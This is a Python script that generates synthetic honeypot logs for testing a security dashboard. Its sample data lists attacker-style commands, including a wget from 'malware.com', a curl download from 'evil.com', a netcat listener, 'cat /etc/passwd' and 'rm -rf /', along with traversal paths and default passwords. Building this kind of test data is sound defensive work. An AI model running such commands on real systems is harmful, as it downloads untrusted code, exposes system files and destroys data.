#!/usr/bin/env python3

import json
import random
import time
from datetime import datetime, timedelta
import os

class SampleDataGenerator:
    def __init__(self):
        self.sample_ips = [
            '192.168.1.100', '10.0.0.50', '172.16.0.25',
            '203.0.113.10', '198.51.100.20', '93.184.216.34',
            '8.8.8.8', '1.1.1.1', '185.199.108.153'
        ]
        
        self.countries = [
            'United States', 'China', 'Russia', 'Germany', 'Brazil',
            'India', 'United Kingdom', 'France', 'Japan', 'Canada'
        ]
        
        self.cities = [
            'New York', 'Beijing', 'Moscow', 'Berlin', 'São Paulo',
            'Mumbai', 'London', 'Paris', 'Tokyo', 'Toronto'
        ]
        
        self.usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'administrator',
            'oracle', 'postgres', 'mysql', 'ftp', 'anonymous'
        ]
        
        self.passwords = [
            'password', '123456', 'admin', 'root', 'test', 'guest',
            'password123', 'qwerty', 'letmein', '12345678'
        ]
        
        self.commands = [
            'ls', 'pwd', 'whoami', 'id', 'uname -a', 'ps aux',
            'cat /etc/passwd', 'wget http://malware.com/bot',
            'curl -O http://evil.com/script.sh', 'nc -l 4444',
            'nmap -sS target', 'rm -rf /', 'history'
        ]
        
        self.http_paths = [
            '/', '/admin', '/wp-admin', '/phpmyadmin', '/login',
            '/api/users', '/config.php', '/../../../etc/passwd',
            '/wp-content/uploads/shell.php', '/cgi-bin/test'
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Nmap Scripting Engine',
            'Nikto/2.1.6',
            'sqlmap/1.4.7',
            'curl/7.68.0',
            'wget/1.20.3'
        ]
    
    def generate_ssh_logs(self, count=100):
        """Generate sample SSH honeypot logs"""
        logs = []
        base_time = datetime.utcnow() - timedelta(hours=24)
        
        for i in range(count):
            timestamp = base_time + timedelta(minutes=random.randint(0, 1440))
            ip = random.choice(self.sample_ips)
            
            # Login attempt
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'service': 'ssh',
                'event_type': 'login_attempt',
                'source_ip': ip,
                'source_port': random.randint(30000, 65535),
                'destination_port': 2222,
                'username': random.choice(self.usernames),
                'password': random.choice(self.passwords),
                'success': False
            }
            logs.append(log_entry)
            
            # Sometimes add command execution
            if random.random() < 0.3:
                cmd_time = timestamp + timedelta(seconds=random.randint(1, 300))
                cmd_entry = {
                    'timestamp': cmd_time.isoformat(),
                    'service': 'ssh',
                    'event_type': 'command_executed',
                    'source_ip': ip,
                    'source_port': log_entry['source_port'],
                    'destination_port': 2222,
                    'command': random.choice(self.commands),
                    'username': log_entry['username']
                }
                logs.append(cmd_entry)
        
        return logs
    
    def generate_http_logs(self, count=150):
        """Generate sample HTTP honeypot logs"""
        logs = []
        base_time = datetime.utcnow() - timedelta(hours=24)
        
        for i in range(count):
            timestamp = base_time + timedelta(minutes=random.randint(0, 1440))
            ip = random.choice(self.sample_ips)
            
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'service': 'http',
                'event_type': 'http_request',
                'source_ip': ip,
                'source_port': random.randint(30000, 65535),
                'destination_port': 8080,
                'method': random.choice(['GET', 'POST', 'PUT', 'DELETE']),
                'path': random.choice(self.http_paths),
                'user_agent': random.choice(self.user_agents),
                'referer': '',
                'body': ''
            }
            
            # Add specific attack types
            if 'admin' in log_entry['path']:
                log_entry['event_type'] = 'web_admin_access'
            elif '../' in log_entry['path']:
                log_entry['event_type'] = 'directory_traversal_attempt'
            elif any(tool in log_entry['user_agent'].lower() for tool in ['nmap', 'nikto', 'sqlmap']):
                log_entry['event_type'] = 'automated_scan'
            
            logs.append(log_entry)
        
        return logs
    
    def generate_ftp_logs(self, count=75):
        """Generate sample FTP honeypot logs"""
        logs = []
        base_time = datetime.utcnow() - timedelta(hours=24)
        
        for i in range(count):
            timestamp = base_time + timedelta(minutes=random.randint(0, 1440))
            ip = random.choice(self.sample_ips)
            
            # Connection attempt
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'service': 'ftp',
                'event_type': 'connection_attempt',
                'source_ip': ip,
                'source_port': random.randint(30000, 65535),
                'destination_port': 2121
            }
            logs.append(log_entry)
            
            # Login attempt
            login_time = timestamp + timedelta(seconds=random.randint(1, 10))
            login_entry = {
                'timestamp': login_time.isoformat(),
                'service': 'ftp',
                'event_type': 'login_attempt',
                'source_ip': ip,
                'source_port': log_entry['source_port'],
                'destination_port': 2121,
                'username': random.choice(['anonymous', 'ftp'] + self.usernames),
                'password': random.choice(['', 'anonymous@'] + self.passwords)
            }
            logs.append(login_entry)
            
            # File operations
            if random.random() < 0.4:
                file_time = login_time + timedelta(seconds=random.randint(1, 60))
                file_entry = {
                    'timestamp': file_time.isoformat(),
                    'service': 'ftp',
                    'event_type': random.choice(['file_download_attempt', 'file_upload_attempt']),
                    'source_ip': ip,
                    'source_port': log_entry['source_port'],
                    'destination_port': 2121,
                    'filename': random.choice(['readme.txt', 'config.conf', 'backup.sql', 'shell.php'])
                }
                logs.append(file_entry)
        
        return logs
    
    def generate_telnet_logs(self, count=50):
        """Generate sample Telnet honeypot logs"""
        logs = []
        base_time = datetime.utcnow() - timedelta(hours=24)
        
        for i in range(count):
            timestamp = base_time + timedelta(minutes=random.randint(0, 1440))
            ip = random.choice(self.sample_ips)
            
            # Connection attempt
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'service': 'telnet',
                'event_type': 'connection_attempt',
                'source_ip': ip,
                'source_port': random.randint(30000, 65535),
                'destination_port': 2323
            }
            logs.append(log_entry)
            
            # Login attempt
            login_time = timestamp + timedelta(seconds=random.randint(1, 30))
            login_entry = {
                'timestamp': login_time.isoformat(),
                'service': 'telnet',
                'event_type': 'login_attempt',
                'source_ip': ip,
                'source_port': log_entry['source_port'],
                'destination_port': 2323,
                'username': random.choice(self.usernames),
                'password': random.choice(self.passwords)
            }
            logs.append(login_entry)
        
        return logs
    
    def save_logs_to_files(self):
        """Save generated logs to files"""
        os.makedirs('logs', exist_ok=True)
        
        # Generate and save SSH logs
        ssh_logs = self.generate_ssh_logs()
        with open('logs/ssh_honeypot.log', 'w') as f:
            for log in ssh_logs:
                f.write(json.dumps(log) + '\n')
        print(f"Generated {len(ssh_logs)} SSH log entries")
        
        # Generate and save HTTP logs
        http_logs = self.generate_http_logs()
        with open('logs/http_honeypot.log', 'w') as f:
            for log in http_logs:
                f.write(json.dumps(log) + '\n')
        print(f"Generated {len(http_logs)} HTTP log entries")
        
        # Generate and save FTP logs
        ftp_logs = self.generate_ftp_logs()
        with open('logs/ftp_honeypot.log', 'w') as f:
            for log in ftp_logs:
                f.write(json.dumps(log) + '\n')
        print(f"Generated {len(ftp_logs)} FTP log entries")
        
        # Generate and save Telnet logs
        telnet_logs = self.generate_telnet_logs()
        with open('logs/telnet_honeypot.log', 'w') as f:
            for log in telnet_logs:
                f.write(json.dumps(log) + '\n')
        print(f"Generated {len(telnet_logs)} Telnet log entries")
        
        # Generate main honeypot log
        all_logs = ssh_logs + http_logs + ftp_logs + telnet_logs
        all_logs.sort(key=lambda x: x['timestamp'])
        
        with open('logs/honeypot.log', 'w') as f:
            for log in all_logs:
                f.write(json.dumps(log) + '\n')
        print(f"Generated {len(all_logs)} total log entries")


def main():
    print("🎲 Generating Sample Honeypot Data")
    print("=" * 40)
    
    generator = SampleDataGenerator()
    generator.save_logs_to_files()
    
    print("\n✅ Sample data generation completed!")
    print("Log files created in logs/ directory")
    print("You can now test the dashboard with this sample data")


if __name__ == '__main__':
    main()